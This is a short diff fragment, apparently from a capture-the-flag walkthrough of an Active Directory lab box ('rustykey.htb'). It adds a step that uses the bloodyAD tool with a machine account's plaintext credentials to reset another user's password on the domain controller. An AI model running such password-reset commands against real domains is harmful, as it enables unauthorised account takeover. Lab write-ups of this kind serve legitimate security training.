@@ -93,6 +93,8 @@
 
 15. Using IT-Computer3$, change bb.morgan's password.
 
+`sudo python3 /opt/bloodyAD/bloodyAD.py -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'Rusty88!' set password bb.morgan Password123`
 
+16. 
 
 
